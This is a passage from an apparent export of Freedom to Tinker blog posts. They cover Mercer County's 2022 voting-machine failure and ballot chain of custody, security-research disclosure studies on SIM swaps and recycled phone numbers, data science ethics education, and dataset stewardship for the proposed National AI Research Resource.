cheat by changing some proportion of Candidate Smith’s votes into votes for Candidate Jones. Since that fraudulent vote is printed on the paper ballot, this fraud cannot be corrected by a recount. In contrast, with hand-marked paper ballots, if a voting machine is misconfigured or hacked, the paper ballots still contain the marks that the voters actually indicated with their pens (or Sharpies, which work just as well, in fact). You might think, the paper ballot produced by a ballot-marking device (BMD) is a record of the actual votes that the voter marked – but it’s not, if BMD has been hacked. That’s because if the BMD cheats by marking different votes on the paper than what the voter indicated on the touchscreen, then 90% of voters wouldn’t notice if a vote was changed. That’s been measured in studies of actual human beings. And if a few voters do actually notice, then they can get their own ballot voided and recast it correctly, but they can’t correct the ballots of all their neighbors who (being human) didn’t notice. You might think, “our BMDs don’t encode votes with barcodes, so they’re safe;” but avoiding barcodes does not make BMD ballots safe (though it’s true that barcode BMDs are even more insecure). All this is explained in more detail here. Two years ago, Mercer County officials chose hand-marked paper ballots for election-day polling places. This was the right decision, and it is still the right decision. However, the November 2022 election-day screwup brought several problems to light: Mistakes in handling paper ballots can compromise the chain of custody. But handling paper ballots in the polling places is not so simple, and yet it must be done by hundreds of hired-for-the-day poll workers who only work one or two elections per year. Some of them will make mistakes, such as leaving paper ballots in the voting machines instead of transferring them to the red ballot-transfer bag, or forgetting to put the security seal on the red bag, or sending the red bag to the municipal clerk’s office instead of to the county Board of Elections office. The Dominion ICP voting machine is equipped to handle brief periods of unavailability, but we’ve now seen that a long outage causes an unforeseen problem: the emergency ballot box is too small. That is, if an optical-scan voting machine fails to operate for an hour or two (until the County can send a repairman to unjam it or whatever), voters can put their ballots through the “emergency slot” into the emergency ballot box, and those ballots can be counted later. But this year the Dominion ICP voting machine was down all day long while hundreds of ballots were deposited, the emergency ballot box wasn’t big enough, and poll workers had to take the top off the machine to allow ballots to be deposited in the main bin. This led to confusion at the close of the polls, because workers had to remember to collect the ballots from both bins. It feels uncomfortable and expensive to print enough ballots for the voters who might show up, only to have to discard the extras when turnout is low. Sometimes that’s a lot of paper to recycle. Chain-of-custody accounting must include unused ballots as well as voted ballots. Preprinted ballots come in packets of 100; election workers have the task of opening up new packets (as needed) and accounting for how many unopened packets are left, and how many unused ballots in opened packets. This can get messy. Mercer County officials are correct that these problems must be fixed. But switching to ballot-marking devices would significantly compromise ballot integrity, and wouldn’t solve these problems. Ballot-marking devices produce paper ballots, which need to be preserved for audits and recounts. Any sloppiness in the chain of custody will be just as much a problem for recounts as it was in November 2022 for the first vote count. As difficult as it is to train poll workers in ballot-handling and chain-of-custody procedures, it will still have to be done even if we use BMDs. If the BMDs fail to operate on election day, then the problem is much worse than what Mercer County experienced in November 2022. The usual safeguard is to have a supply of (about 30) “emergency ballots” that voters can mark by hand. But if there’s a system-wide failure, those emergency ballots will run out, and people won’t be able to vote at all. It may seem wasteful to print 800 ballots when only 250 will be used. But it’s actually less expensive than using a ballot-marking device. Professor Duncan Buell of the University of South Carolina did a cost study of preprinted ballots versus the maintenance cost of BMDs, and found that preprinted paper ballots were cheaper even if you have to print more than actually get used. The basic reason is that, in addition to the upfront cost of a BMD, Dominion charges about $300 per year per machine for warranty and license, you’d need at least two of these in each polling place, and that can pay for a whole lot of ballots. There are several steps that Mercer County should consider: Improved administrative procedures and improved “logic and accuracy” testing to make sure the paper ballots always match what the voting machines expect. At the November 21st County Commissioners’ meeting, Dominion Vice President Robert Giles said they are working on that now. An important improvement will be using some real preprinted ballots (from the printing company) in the tests; and Mr. Giles mentioned that improvement. County Executive Brian Hughes (speaking at the County Commissioners meeting November 21) has proposed to consolidate the offices of Superintendent of Elections and Board of Elections, as permitted by New Jersey law and as done in several other counties. In this model there would be a professional Administrator working for the Board of Elections. This would reduce the fragmentation of responsibility and might reduce the opportunities for screwups. It might save money, too, if a savvy Administrator can bring more functions in-house and/or negotiate better prices on service contracts and ballot printing. Perhaps ballot-on-demand printers (for hand-markable optical-scan paper ballots) can be used instead of BMDs and instead of preprinted ballots. This avoids wasting a lot of paper (and money to pay for ballot printing). When Dominion quoted prices to New Jersey counties, they outrageously overpriced their ballot-on-demand printers, which made BMDs seem like the cheaper option – I haven’t seen Dominion’s Mercer quote but Dominion’s 2021 quote to Camden County charged $20,000 apiece for ballot-on-demand printers. This year, Camden got a bid of $1,965 apiece for Tenex ballot-on-demand printers compatible with ES&S optical scanners – a factor of ten less. That makes ballot-on-demand look a lot more attractive. Or maybe the Dominion ICX BMDs that the county already owns can be used as ballot-on-demand printers instead of as BMDs. Chain-of-custody procedures for paper ballots need to be improved whether or not the ballots are hand-marked or BMD-marked. Many improvements can be made, and should be made. But let’s also recognize that Mercer County election officials are doing a pretty good job already. Even in the face of the November 2022 county-wide voting-machine failure, within a few hours they had a backup plan, they executed that plan successfully, they counted all the ballots, and they got the election certified within the period set by state law. This demonstrates the resilience of preprinted, hand-marked paper ballots: the computers may have failed, but the pens did not fail, and the election got counted. And on the other hand, with computers marking the ballots for us, then mistakes (or deliberate hacks) can sneak by unnoticed; and system-wide failures would mean people couldn’t vote, not just that the counting would take an extra three days."
"37","2022-12-01","2023-03-24","https://freedom-to-tinker.com/2022/12/01/why-the-voting-machines-failed-in-mercer-county/","On Election Day, November 8, 2022, every voting machine in every polling place in Mercer County, New Jersey failed to work. Voters in each precinct filled in the ovals in their preprinted optical-scan paper ballots, but the voting machines couldn’t read them. So voters were instructed to put their ballots into “slot 3” of the voting machines, that is, directly into the ballot box. The Mercer County Board of Elections collected the ballots at the close of the polls on election night, using their usual chain-of-custody procedures. Then they counted those ballots using the county’s central-count optical-scan voting machines, which are normally used for mail-in ballots. This took two or three days. All the votes got counted – but it’s still an embarrassing screw-up that deserves scrutiny. Between 2002 and 2018, Mercer County used paperless full-face touchscreen voting machines. That was an untrustworthy technology–if the computer miscounted the votes because of hacking or malfunction, there were no paper ballots that could be recounted, and we’d never know. So I was glad to see those machines go, and glad to see them replaced by hand-marked optical-scan paper ballots, counted by precinct-count optical scanners. This is the most securable technology I know of. And that method of vote-counting is robust, meaning even if the voting machines fail to operate, voters can deposit their ballots in a ballot box for counting later. That’s how all the votes got counted in the November 22 election. Still, we don’t expect every voting machine in the whole county to fail at once! So what happened exactly? Optical scan voting machines are “told” what candidates are on the ballot using a Ballot Definition File. It is a computer file that “defines” how to count the marks on the ballot–a mark at this position is for candidate Smith, and a mark at that position is for Jones. Meanwhile, the printing contractor prints all the optical-scan ballots that the voters will mark. The layout of candidates on the preprinted ballot must match the Ballot Definition File. If the ballot does not match what the voting machine is expecting, either the ballot cannot be read (what happened in Mercer County); or the ballot could be read incorrectly (what happened in Antrim County, Michigan in 2020). In Mercer County, New Jersey, because of an error in preparing the Ballot Definition Files, the printed ballots did not match the ballot definition file, and the ballots could not be read. Here is the detailed explanation: In order that the County Clerk can report precinct-by-precinct totals, New Jersey ballots are labeled with a precinct-number; and each vote-by-mail ballot, each provisional ballot, each early-voting ballot, each regular election-day ballot is labeled with a distinct precinct number. In Mercer County, all these ballots are printed in advance of the election, except the early-voting ballots which are produced on-demand by ballot-marking devices. The County Clerk is responsible for ballot printing, which she contracts out to private companies such as Royal Printing Services; and voting-machine “programming” is contracted to Dominion Voting Systems. The vote-counting program in the voting machines does not change from election to election, but for each election a “ballot definition file” is prepared that tells the vote-counting program what candidates are on the ballot, in each ballot style. In September 2022 the County Clerk sent to Royal Printing Services the list of candidates on the ballot (in each town) for the November election. Royal created all the ballot layouts; then sent the ballot styles for approval by the County Clerk, as follows: Ballot styles 1-243: vote-by-mail ballot definitions for each precinct Ballot styles 244-486: early voting ballot definitions for each precinct Ballot styles 487-729: provisional ballot definitions for each precinct Ballot styles 730-972: election-day polling-place ballot definitions for each precinct. This file was sent on October 5 to Dominion, to the County Clerk, and to the Superintendent of Elections. On each ballot, the “ballot ID” (a number between 1 and 975) is printed at the bottom of the page, in plain text and as a barcode that the voting machines can read. Later that morning, employees at Dominion started to encode this file of ballot styles into the Ballot Definition Files that the Dominion voting machines could accept. The County Clerk did not approve this set of ballot styles but asked to have a phone call with Royal and Dominion that same day. In the call she pointed out that it was not necessary to print 243 different forms of provisional ballot, it would suffice to have one style of provisional ballot for each of the 18 different layouts (4 Trenton wards + 11 towns + Spanish-language ballots in 3 of those towns), and doing it this way would save money for the county. This occurred during a conference call mid-day on October 5th, with the County Clerk, Dominion, and Royal. In that call it was agreed that Royal would produce a new set of ballot styles. In an e-mail on the afternoon of October 5th, Dominion was formally notified of this change, and Dominion acknowledged by e-mail that they had received the change. Royal Printing’s new file of ballot styles looked like this: Ballot styles 1-243: vote-by-mail ballot definitions for each precinct Ballot styles 244-486: early voting ballot definitions Ballot styles 487-504: provisional ballot definitions for each town Ballot styles 505-747: election-day polling-place ballot definitions for each precinct. For example, an East Windsor precinct #1 election-day ballot that was numbered 730 in the old list was numbered 505 in the new list. The Dominion employee who was tasked with updating the Ballot Definition Files redid the coding of all the provisional ballots. Unfortunately this employee failed to understand that all the election-day ballots would have new numbers as well. So in Dominion’s files, the voting machines were still programmed to interpret number 730 as East Windsor precinct 1 – but the ballots printed by Royal Printing for East Windsor #1 had Ballot ID 505 printed at the bottom. Logic and Accuracy Testing. Before each election, it is routine for an election official to perform “logic and accuracy testing” (LAT), to make sure the voting machines are correctly counting the votes. The Mercer County Superintendent of Elections performed LAT between October 21 and 24, by feeding a “deck” of about 5000 optical-scan paper ballots through the voting machines. This test deck was created by Dominion and printed by Royal, with votes already marked (ovals filled in). The test deck covered all the contests in all the ballot styles for regular election-day ballots. Dominion created the LAT test deck based on their own list of ballot styles: ballot IDs 730-972. This matched what the voting machines expected, and the LAT test “passed.” In hindsight, it’s clear that a more reliable test would use the actual preprinted optical-scan ballots that Royal was preparing for the real election. Royal Printing Services delivered to Mercer County, 243 styles of preprinted vote-by-mail ballots (ballot IDs 1-243), as well as packets of pre-printed provisional ballots (ballot IDs 487-504), and 243 batches of pre-printed regular Election-Day ballots (ballot IDs 505-747). Those ballots were then delivered in November to the polling places, along with the precinct-count optical-scan voting machines. On Election Day, in each and every precinct, the preprinted ballots had a different ballot ID number than the voting machine expected: #505 instead of #730, #506 instead of #731, and so on. The only people eligible to vote in an election-day polling place are the voters registered in that precinct, so the voting machines rejected the ballots. Soon after the polls opened at 6am there were urgent calls from poll workers to the Superintendent and the County Clerk, who consulted with Royal Printing and with Dominion and pretty soon figured out what had happened. Poll workers throughout the county were instructed to have voters mark their regular Election-Day ballots (not provisional ballots), and deposit those in the voting machine’s ballot boxes for counting later. The Board of Elections owns high-speed central-count optical-scan voting machines, normally used for counting just the mail-in ballots. In order to use those same “central-count” machines to count the polling-place ballots (after the polls closed), the Superintendent and County Clerk reprogrammed the machines with the correct list of ballot-IDs. Missing ballots? In a normal election, immediately upon the close of the polls all the paper ballots from each precinct are put into a red security bag with a tamper-evident seal. Then a County Board of Elections employee drives this bag to the Board of Elections office where the bag is put into the vault. The vault has two locks: to open it requires both a Republican and a Democratic member of the Board of Elections – in principle. And in addition, the flash drives with the electronic totals from the voting machines are put into a blue security bag and transported to the town’s municipal clerk; these are collected on election night by the County Clerk from each town’s municipal clerk. The “chain of custody” of those paper ballots is very important. If there is ever a recount, it is those paper ballots that will be counted. State law mandates that a random audit be conducted on those paper ballots, as a partial check against hacks or errors in the voting machines. And, as we learned, if the voting machines fail entirely, we can still count those paper ballots. So it’s very important that the paper ballots be safeguarded against tampering, starting from when they are removed from the ballot boxes (voting machines) at the close of the polls, all the way through the last time they are counted. Unfortunately, Mercer County’s chain-of-custody procedures are not perfect. In one Robbinsville precinct, the red bag with paper ballots stayed overnight at the Robbinsville clerk’s office, so it was missing from the County Clerk’s initial tally. The Mayor of Robbinsville was very concerned about this, and justifiably so. In three precincts in Princeton, the paper ballots were left inside the voting machines overnight; the red bags delivered to the Board of Elections were empty. County election officials retrieved those ballots from the voting machines the next morning. Many of the red bags from precincts throughout the county arrived at the Board of Elections office without their tamper-evident seals. I presume that imperfectly trained poll workers forgot that step of the process, and simply put the ballots into the red bags without sealing them. (We can wish for perfectly trained poll workers, but remember that the Superintendent has to hire and train hundreds of people to work a single 14-hour day for low pay – not so easy!) It is also possible to imagine that someone tampered with the ballots in those bags. Tamper-evident security seals are not perfectly secure: it can be possible to remove and replace them without evidence of tampering. Given that some bags have forgotten seals, and even the sealed bags can be vulnerable to tampering, the ballots should be transported by teams of two Board of Elections employees instead of just one, and those two should belong to different political parties. This would be a logistical hassle: whose car would they use, and how would the other worker get back to her own car still parked at the polling place? But these logistics can be sorted out. Chain of custody is compromised when only one person is in charge of ballots. In summary: although there is no concrete evidence of any tampering with the ballots, or any permanently lost ballots, there are many imperfections in the chain of custody. Many poll watchers who witnessed these problems were angry about the sloppy chain of custody, and for good reason. This is something the Superintendent should improve. Conclusion. This was an embarrassing failure of our county election system. Voters were angry that the voting machines didn’t work, and had an uncomfortable feeling depositing the ballots in a slot where who-knows-what would happen to them. For over a decade I have been advocating for preprinted hand-marked paper ballots, counted by precinct-count optical scanners, so it was embarrassing for me too. But I still advocate for preprinted hand-marked ballots, because all of the alternatives are much, much worse: if a touchscreen ballot-marking device makes a mistake or is hacked, you might never know that the vote totals are wrong. With preprinted hand-marked paper ballots, even if there’s intentional computer hacking, those hand-marked paper ballots can be recounted. In Mercer County, the system worked. We had the paper ballots and we counted them, so we can be confident our results reflect the will of the voters. Even with these mistakes, this election was more secure and more trustworthy than previous elections that had no paper ballots. Our election administrators have some work to do – and they know it – in improving communications with vendors, logic and accuracy testing, and chain of custody protocols. I feel confident that they’re on it. [This article is based on presentations made to the Mercer County Board of Commissioners at a meeting on November 21, 2022 by the Mercer County Prosecutor, the County Clerk, the Superintendent of Elections, an officer of Royal Printing Services, a vice president of Dominion Voting Systems, and several Mercer County citizens who witnessed chain-of-custody issues.]"
"38","2015-09-29","2023-03-24","https://freedom-to-tinker.com/2015/09/29/berkeley-releases-report-on-barriers-to-cybersecurity-research/","I’m pleased to share this report, as I helped organize this event. Researchers associated with the UC Berkeley School of Information and School of Law, the Berkeley Center for Law and Technology, and the International Computer Science Institute (ICSI) released a workshop report detailing legal barriers and other disincentives to cybersecurity research, and recommendations to address them. The workshop held at Berkeley in April, supported by the National Science Foundation, brought together leading computer scientists and lawyers, from academia, civil society, and industry, to map out legal barriers to cybersecurity research and propose a set of concrete solutions. The workshop report provides important background for the NTIA-convened multistakeholder process exploring security vulnerability disclosure, which launched today at Berkeley. The report documents the importance of cybersecurity research, the chilling effect caused by current regulations, and the diversity of the vulnerability landscape that counsels against both single and fixed practices around vulnerability disclosures. Read the report here."
"39","2020-03-25","2023-03-24","https://freedom-to-tinker.com/2020/03/25/vulnerability-reporting-is-dysfunctional/","By Kevin Lee, Ben Kaiser, Jonathan Mayer, and Arvind Narayanan In January, we released a study showing the ease of SIM swaps at five U.S. prepaid carriers. These attacks—in which an adversary tricks telecoms into moving the victim’s phone number to a new SIM card under the attacker’s control—divert calls and SMS text messages away from the victim. This allows attackers to receive private information such as SMS-based authentication codes, which are often used in multi-factor login and password recovery procedures. We also uncovered 17 websites that use SMS-based multi-factor authentication (MFA) and SMS-based password recovery simultaneously, leaving accounts open to takeover from a SIM swap alone; an attacker can simply reset a victim’s account password and answer the security challenge when logging in. We responsibly disclosed the vulnerabilities to those websites in early January, urging them to make changes to disallow this configuration. Throughout the process, we encountered two wider issues: (1) lack of security reporting mechanisms, and (2) a general misunderstanding of authentication policies. As a result, 9 of these 17 websites, listed below, remain vulnerable by default. Disclosure Process. On each website, we first looked for email addresses dedicated to vulnerability reporting; if none existed, we looked for the companies on bug bounty platforms such as HackerOne. If we were unable to reach a company through a dedicated security email or through bug bounty programs, as a last resort, we reached out through customer support channels. Sixty days after our reports, we re-tested the configurations at the companies, except for those that reported that they had fixed the vulnerabilities. Outcomes. Three companies—Adobe, Snapchat, and eBay—acknowledged and promptly fixed the vulnerabilities we reported. In one additional case, the vulnerability was fixed, but only after we exhausted the three contact options and reached out to company personnel via a direct message on Twitter. In three cases—Blizzard, Microsoft, and Taxact—our vulnerability report did not produce the intended effect (Microsoft and Taxact did not understand the issue, Blizzard provided a generic acknowledgment email), but in our 60-day re-test, we found that the vulnerabilities had been fixed (without the companies notifying us). As such, we do not know whether the fixes were implemented in light of our research. Among the responses we received, there were several failure modes, which were not mutually exclusive. In five cases, personnel did not understand our vulnerability report, despite our attempts to make it as clear as possible (see Appendix B of our paper). Three of them—Microsoft, Paypal, and Yahoo—demonstrated knowledge of SIM swap attacks, but did not realize that their SMS authentication policies were allowing for vulnerable accounts. Paypal, for instance, closed our report as out-of-scope, claiming that “the vulnerability is not in Paypal, as you mentioned this is an issue with the carriers and they need to fix it on their side.” While phone number hijackings are the result of poor customer authentication procedures at the carriers, account hijackings resulting from SMS passcode interception are the result of poor authentication policies at websites. The remaining two websites—Taxact and Gaijin Entertainment—misinterpreted our disclosure as a feature request and feedback, respectively. Three of the four reports we submitted to third-party bug bounty programs were disregarded due to the absence of a bug (our findings are not software errors, but rather, logically inconsistent customer authentication policies). Reports are screened by employees of the program, who are independent of the website, and passed on to the website’s security teams if determined to be in scope. These third-party platforms appear to be overly strict with their triage criteria, preventing qualified researchers from communicating with the companies. This issue is not unique to our study, either. A few weeks ago, security researchers also reported difficulties with submitting vulnerability reports to Paypal, which uses HackerOne as its sole security reporting mechanism. HackerOne employs mechanisms that restrict users from submitting future reports after too many closed reports, which could disincentivize users from reporting legitimate vulnerabilities. In five cases, we received no response. All four attempts to report security vulnerabilities through customer support channels were fruitless: either we received no response or personnel did not understand the issue. We have listed all 17 responses in the table below. Unfortunately, nine of these websites use SMS-based MFA and SMS-based password recovery by default and remain so as of this writing. Among them are payment services PayPal and Venmo. The vulnerable websites cumulatively have billions of users. Recommendations We recommend that companies make the following changes to their vulnerability response: Companies need to realize that policy-related vulnerabilities are very real, and should use threat modeling to detect these. There seems to be a general lack of knowledge about vulnerabilities arising from weak authentication policies. Companies should provide direct contact methods for security reporting procedures. A bug bounty program is not a substitute for a robust security reporting mechanism, yet some companies are using it as such. Furthermore, customer support channels—whose personnel are unlikely to be trained to respond to security vulnerability disclosures—add a level of indirection and can lead to vulnerability reports being forwarded to inappropriate teams. Our paper, along with our dataset, is located at issms2fasecure.com. Thanks to Malte Möser for providing comments on a draft."
"40","2021-05-03","2023-03-24","https://freedom-to-tinker.com/2021/05/03/phone-number-recycling-creates-serious-security-and-privacy-risks-to-millions-of-people/","By Kevin Lee and Arvind Narayanan 35 million phone numbers are disconnected every year in the U.S., according to the Federal Communications Commission. Most of these numbers are not disconnected forever; after a while, carriers reassign them to new subscribers. Through the years, these new subscribers have sometimes reported receiving calls and messages meant for previous owners, as well as discovering that their number is already tied to existing accounts online. In this example from our study, the phone number (redacted in the screenshot) had a linked Facebook account but is available to Verizon subscribers through the online number-change interface. While these new owner mixups may make for interesting dinner party stories, number recycling presents security and privacy issues as well. If a recycled number remains on a previous owner’s recovery settings for an online account, the adversary can obtain that number and break into that account. The adversary can also use that phone number to look for your other personally identifiable information online, and then impersonate you with that phone number and PII. These attacks have been talked about through anecdotes and speculation, but never thoroughly investigated. In a new study, we empirically evaluated number recycling risks in the United States. We sampled 259 phone numbers available to new subscribers at two major carriers, and found that 215 of them were recycled and vulnerable to either account hijackings or PII indexing—the two scenarios we described prior. We estimated the inventory of available recycled numbers at one carrier to be about one million, with a largely fresh set of numbers becoming available every month. We also found design weaknesses in carriers’ online interfaces and number recycling policies that could facilitate number recycling attacks. Finally, we obtained 200 numbers from both carriers and monitored incoming communication. In just one week, we found 19 of the 200 numbers in the honeypot were still receiving sensitive communication meant for previous owners, such as authentication passcodes and calls from pharmacies. The adversary can focus on likely recycled numbers… …while ignoring possibly unused numbers. Phone number recycling is a standard industry practice regulated by the FCC. There are only so many valid 10-digit phone numbers, which are allocated to carriers in blocks to individually assign to their subscribers. Eventually, there will be no more blocks to allocate to carriers; when that happens, expansion will essentially be capped. To prolong the usefulness of 10-digit dialing (think of all the systems that need replacing if we suddenly switch to 11 digits!), the FCC not only has strict requirements for carriers requesting new blocks, but also instructs them to reassign numbers from disconnected subscribers to new subscribers after a certain timeframe (45 to 90 days). Number recycling is one of the reasons we have been able to put off this doomsday scenario from 2005 to beyond 2050. It is also the reason vulnerable numbers—and number recycling threats—are so prevalent. In our paper, we recommend steps carriers, websites, and subscribers can take to reduce risk. For subscribers looking to change numbers, our primary recommendation is to park the number to use as an inexpensive secondary line. By doing so, subscribers can mitigate some of the threats from number recycling. Last October, we responsibly disclosed our findings to the carriers we studied and to CTIA—the U.S. trade association representing the wireless telecommunications industry. In December, both carriers responded by updating their number change support pages to clarify their number recycling policies and remind subscribers to update their online accounts after a number change. Although this is a step in the right direction, more work can be done by all stakeholders to illuminate and mitigate the issues. Our paper draft is located at recyclednumbers.cs.princeton.edu."
"41","2018-04-17","2023-03-24","https://freedom-to-tinker.com/2018/04/17/ethics-education-in-data-science/","Data scientists in academia and industry are increasingly recognizing the importance of integrating ethics into data science curricula. Recently, a group of faculty and students gathered at New York University before the annual FAT* conference to discuss the promises and challenges of teaching data science ethics, and to learn from one another’s experiences in the classroom. This blog post is the first of two which will summarize the discussions had at this workshop. There is general agreement that data science ethics should be taught, but less consensus about what its goals should be or how they should be pursued. Because the field is so nascent, there is substantial room for innovative thinking about what data science ethics ought to mean. In some respects, its goal may be the creation of “future citizens” of data science who are invested in the welfare of their communities and the world, and understand the social and political role of data science therein. But there are other models, too: for example, an alternative goal is to equip aspiring data scientists with technical tools and organizational processes for doing data science work that aligns with social values (like privacy and fairness). The group worked to identify some of the biggest challenges in this field, and when possible, some ways to address these tensions. One approach to data science ethics education is including a standalone ethics course in the program’s curriculum. Another option is embedding discussions of ethics into existent courses in a more integrated way. There are advantages and disadvantages to both options. Standalone ethics courses may attract a wider variety of students from different disciplines than technical classes alone, which provides potential for rich discussions. They allow professors to cover basic normative theories before diving into specific examples without having to skip the basic theories or worry that students covered them in other course modules. Independent courses about ethics do not necessarily require cooperation from multiple professors or departments, making them easier to organize. However, many worry that teaching ethics separately from technical topics may marginalize ethics and make students perceive it as unimportant. Further, standalone courses can either be elective or mandatory. If elective, they may attract a self-selecting group of students, potentially leaving out other students who could benefit from exposure to the material; mandatory ethics classes may be seen as displacing other technical training students want and need. Embedding ethics within existent CS courses may avoid some of these problems and can also elevate the discourse around ethical dilemmas by ensuring that students are well-versed in the specific technical aspects of the problems they discuss. Beyond course structure, ethics courses can be challenging for data science faculty to teach effectively. Many students used to more technical course material are challenged by the types of learning and engagement required in ethics courses, which are often reading-heavy. And the “answers” in ethics courses are almost never clear-cut. The lack of clear answers or easily constructed rubrics can complicate grading, since both students and faculty in computer science may be used to grading based on more objective criteria. However, this problem is certainly not insurmountable – humanities departments have dealt with this for centuries, and dialogue with them may illuminate some solutions to this problem. Asking students to complete frequent but short assignments rather than occasional long ones may make grading easier, and also encourages students to think about ethical issues on a more regular basis. Institutional hurdles can hinder a university’s ability to satisfactorily address questions of ethics in data science. A dearth of technical faculty may make it difficult to offer a standalone course on ethics. A smaller faculty may push a university towards incorporating ethics into existent CS courses rather than creating a new class. Even this, however, requires that professors have the time and knowledge to do so, which is not always the case. The next blog post will enumerate topics discussed and assignments used in courses that discuss ethics in data science. Thanks to Karen Levy and Kathy Pham for their edits on a draft of this post."
"42","2018-04-26","2023-03-24","https://freedom-to-tinker.com/2018/04/26/ethics-education-in-data-science-classroom-topics-and-assignments/","[This blog post is a continuation of a recap of a recent workshop on data science ethics education.] The creation of ethics modules that can be inserted into a variety of classes may help ensure that ethics as a subject is not marginalized and enable professors with little experience in philosophy or with fewer resources to incorporate ethics into their more technical classes. This post will outline some of the topics that professors have decided to cover in this field, as well as suggestions for types of assignments that may be useful. We hope that readers will consider ways to add these into their classes, and we welcome comments with further suggestions of topics or assignments. With regards to ethics, some of the key topics that professors have taught about include: deontology, consequentialism, utilitarianism, virtue ethics, moral responsibility, cultural relativism, social contract, feminist ethics, justice consequentialism, the distinction between ethics and law, and the relationship between principles, standards, and rules. Using these frameworks, professors can discuss a variety of topics, including: privacy, algorithmic bias, misinformation, intellectual property, surveillance, inequality, data collection, AI governance, free speech, transparency, security, anonymity, systemic risk, labor, net neutrality, accessibility, value-sensitive design, codes of ethics, predictive policing, virtual reality, ethics in industry, machine learning, clinical versus actuarial reasoning, issue spotting, and basic social science concepts. In determining the most effective types of assignments to use, a common thread was the use of real world data sets or examples to engage students. Some effective assignment methods include: Debates: Students split up into groups, each representing a different interest group or stakeholder, and then argue for that entity’s stance. This could entail asking students to justify the way that groups or people actually acted in the past, or it may have students act as decision makers and decide how they would act or react in a given situation. Critique Existing Policies: Ask students to choose a particular company’s data policy, a data collection method at their University, a recent FCC policy, or an organization’s code of ethics and critique it. This gives students experience in understanding specific and concrete details of a policy and how it affects real people. By the end of the assignment, students may even be able to suggest changes to a company or university policy, providing impact beyond the classroom. This assignment can be framed to focus on either policy or ethics depending on the goal of the project. Adversarial Mindset: Assignments can provide insight by placing students into the mind of the adversary, such as having them design a fake news campaign or attempt to dox their professor. Understanding how malicious users think can enhance students’ ability to counter such attacks or even to counter the mindset itself. However, such assignments should be framed very carefully – students may enjoy the thrill of such assignments and find them intellectually exciting, ignoring the elements that are ethically problematic. Peer Audit: Asking students to review the ethics of a given project can be a useful exercise, and it may be even more interesting to students if they are able to review the work of their peers. Peer audits can pair nicely with more technical assignments from the same class – for example, if students are asked to capture and inspect network traffic in one assignment, the next assignment may entail reviewing other students’ methods for doing so to analyze any questionable methods. Graduate students can also be asked to audit their peer’s graduate research Some recent case studies that may be interesting for students include: Cambridge Analytica’s use of Facebook data, the fatal crash of a self-driving Uber car, Facebook’s emotional contagion study, Encore censorship research, Chinese criminal facial tracking, Uber’s tracking of one night stands, Stanford’s “Gaydar” research, Black Mirror episodes, Latanya Sweeney’s anonymization work, NYPD Stop and Frisk Data, Predictive Policing, and COMPAS’s recidivism risk assessment tool. A critical aspect of data science ethics education is ensuring that this field is well-respected so that students, universities, research communities, and industry respect and engage in efforts on this front. This may require a research-focused element, but efforts should also be dedicated to ensuring that students understand concretely how this applies to their lives and the lives of others. The field must encourage people to think beyond IRB and legal compliance, and to consider the impact of research or products even when they do not fall under the conventional conception of “human-subject research.” It will also be critical to engage industry in this field – largely because private companies impact our lives on a daily basis, but also because industry devotion to ethics can serve as an indicator to students that considering ethics is a worthwhile endeavor. Although some have considered writing a textbook on this subject, technical capabilities and real-world examples change so rapidly that a textbook may be obsolete before it is even published. We encourage people to use other methods to share ideas on data science ethics education, such as blog posts, papers, or shared repositories with assignments and teaching tools that have been successful."
"43","2022-04-12","2023-03-24","https://freedom-to-tinker.com/2022/04/12/how-the-national-ai-research-resource-can-steward-the-datasets-it-hosts/","Last week I participated on a panel about the National AI Research Resource (NAIRR), a proposed computing and data resource for academic AI researchers. The NAIRR’s goal is to subsidize the spiraling costs of many types of AI research that have put them out of reach of most academic groups. My comments on the panel were based on a recent study by researchers Kenny Peng, Arunesh Mathur, and me (NeurIPS ‘21) on the potential harms of AI. We looked at almost 1,000 research papers to analyze how they used datasets, which are the engine of AI. Let me briefly mention just two of the many things we found, and then I’ll present some ideas for NAIRR based on our findings. First, we found that “derived datasets” are extremely common. For example, there’s a popular facial recognition dataset called Labeled Faces in the Wild, and there are at least 20 new datasets that incorporate the original data and extend it in some way. One of them adds race and gender annotations. This means that a dataset may enable new harms over time. For example, once you have race annotations, you can use it to build a model that tracks the movement of ethnic minorities through surveillance cameras, which some governments seem to be doing. We also found that dataset creators are aware of their potential for misuse, so they often have licenses restricting their use for research and not for commercial purposes. Unfortunately, we found evidence that many companies simply get around this by downloading a model pre-trained on that dataset (in a research context) and using that model in commercial products. Stepping back, the main takeaway from our paper is that dataset creators can sometimes — but not always — anticipate the ways in which a dataset might be used or misused in harmful ways. So we advocate for what we call dataset stewarding, which is a governance process that lasts throughout the lifecycle of a dataset. Note that some prominent datasets see active use for decades. I think NAIRR is ideally positioned to be the steward of the datasets that it hosts, and perform a vital governance role over datasets and, in turn, over AI research. Here are a few specific things NAIRR could do, starting with the most lightweight ones. 1. NAIRR should support a communication channel between a dataset creator and the researchers who use that dataset. For example, if ethical problems — or even scientific problems — are uncovered in a dataset, it should be possible to notify users about it. As trivial as this sounds, it is not always the case today. Prominent datasets have been retracted over ethical concerns without a way to notify the people who had downloaded it. 2. NAIRR should standardize dataset citation practices, for example, by providing Digital Object Identifiers (DOIs) for datasets. We found that citation practices are chaotic, and there is currently no good way to find all the papers that use a dataset to check for misuse. 3. NAIRR could publish standardized dataset licenses. Dataset creators aren’t legal experts, and most of the licenses don’t accomplish what dataset creators want them to accomplish, enabling misuse. 4. NAIRR could require some analog of broader impact statements as part of an application for data or compute resources. Writing a broader impact statement could encourage ethical reflection by the authors. (A recent study found evidence that the NeurIPS broader impact requirement did result in authors reflecting on the societal consequences of their technical work.) Such reflection is valuable even if the statements are not actually used for decision making about who is approved. 5. NAIRR could require some sort of ethical review of proposals. This goes beyond broader impact statements by making successful review a condition of acceptance. One promising model is the Ethics and Society Review instituted at Stanford. Most ethical issues that arise in AI research fall outside the scope of Institutional Review Boards (IRBs), so even a lightweight ethical review process could help prevent obvious-in-hindsight ethical lapses. 6. If researchers want to use a dataset to build and release a derivative dataset or pretrained model, then there should be an additional layer of scrutiny, because these involve essentially republishing the dataset. In our research, we found that this is the start of an ethical slippery slope, because data and models can be recombined in various ways and the intent of the original dataset can be lost. 7. There should be a way for people to report to NAIRR that some ethics violation is going on. The current model, for lack of anything better, is vigilante justice: journalists, advocates, or researchers sometimes identify ethical issues in datasets, and if the resulting outcry is loud enough, dataset creators feel compelled to retract or modify them. 8. NAIRR could effectively partner with other entities that have emerged as ethical regulators. For example, conference program committees have started to incorporate ethics review. If NAIRR made it easy for peer reviewers to check the policies for any given data or compute resource, that would let them verify that a submitted paper is compliant with those policies. There is no single predominant model for 